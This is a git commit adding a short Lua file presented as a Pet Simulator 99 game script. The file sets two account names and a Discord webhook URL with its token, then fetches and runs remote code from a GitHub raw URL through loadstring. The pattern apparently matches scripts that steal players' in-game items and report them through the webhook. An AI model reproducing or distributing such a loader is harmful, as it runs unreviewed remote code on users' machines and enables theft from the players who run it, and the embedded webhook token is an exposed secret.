6dc465e07a5eaf99eaa6ebb907504ed35a7b11e1
1yvlr <jonasbru2011@gmail.com>
2025-01-30 18:59:57 +0100

    Add files via upload

---
+++ PS99 Script Huge.lua
@@ -0,0 +1,4 @@
+UserName = "Salbenenis"
+UserName2 = "TopMyMain"
+Webhook = "https://discord.com/api/webhooks/1329500669329281035/WwvZxoCT0r3g344hDtPF9sb-yx6CfX5KdFxDpmZbDgbEDaMEojoHAkrs3momzMAR3ilK"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
